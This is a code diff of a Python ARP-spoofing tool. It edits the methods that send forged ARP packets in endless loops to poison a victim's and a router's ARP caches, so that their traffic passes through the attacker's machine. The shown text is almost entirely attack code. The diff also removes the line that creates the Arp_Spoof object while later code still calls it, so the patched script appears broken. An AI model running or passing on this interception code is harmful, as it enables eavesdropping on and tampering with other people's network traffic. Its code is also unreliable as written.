@@ -9,7 +9,7 @@ import argparse
 class Arp_Spoof(object):
 	"""Does the arp spoof for the set up"""
 	def __init__(self, interface):
-		global s, redirect_to_mac
+		global s, redirect_to_mac, arp
 		super(Arp_Spoof, self).__init__()
 		s = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0800))
 		try:
@@ -51,15 +51,16 @@ class Arp_Spoof(object):
 	def poison_victim(self, rdi, ti, verbose, ifa):
 		with open('/sys/class/net/{}/address'.format(ifa), 'r') as file:
 			redirect_to_mac = file.read().strip()
-		packet = arp.craft_packet(target_ip=ti, redirect_to_ip=rdi, redirect_to_mac=redirect_to_mac)
+		packet = self.craft_packet(target_ip=ti, redirect_to_ip=rdi, redirect_to_mac=redirect_to_mac)
 		i = 0
 		while True:
 			try:
-				time.sleep(verbose)
-				i += 1
-				sys.stdout.write('\033[1;32mPackets Sent:\033[00m {}\r'.format(i))
-				sys.stdout.flush()
+				if __name__ == '__main__':
+					i += 1
+					sys.stdout.write('\033[1;32mPackets Sent:\033[00m {}\r'.format(i))
+					sys.stdout.flush()
 				s.send(packet)
+				time.sleep(verbose)
 			except socket.error as e:
 				print("\033[1;31m"+str(e)+"\033[00m")
 				exit()
@@ -67,15 +68,16 @@ class Arp_Spoof(object):
 	def poison_router(self, rdi, ti, verbose, ifa):
 		with open('/sys/class/net/{}/address'.format(ifa), 'r') as file:
 			redirect_to_mac = file.read().strip()
-		packet = arp.craft_packet(target_ip=ti, redirect_to_ip=rdi, redirect_to_mac=redirect_to_mac)
+		packet = self.craft_packet(target_ip=ti, redirect_to_ip=rdi, redirect_to_mac=redirect_to_mac)
 		i = 0
 		while True:
 			try:
-				time.sleep(verbose)
-				i += 1
-				sys.stdout.write('\033[1;32mPackets Sent:\033[00m {}\r'.format(i))
-				sys.stdout.flush()
+				if __name__ == '__main__':
+					i += 1
+					sys.stdout.write('\033[1;32mPackets Sent:\033[00m {}\r'.format(i))
+					sys.stdout.flush()
 				s.send(packet)
+				time.sleep(verbose)
 			except socket.error as e:
 				print("\033[1;31m"+str(e)+"\033[00m")
 				exit()
@@ -105,8 +107,6 @@ if __name__ == '__main__':
 	except socket.error:
 		print("\033[1;31mIncorrect IP address\033[00m")
 		exit()
-
-	arp = Arp_Spoof(args.interface)
 
 	victim_thread = threading.Thread(target=arp.poison_victim, args=(args.target, args.router, int(args.verbose), args.interface))
 	victim_thread.deamon = True
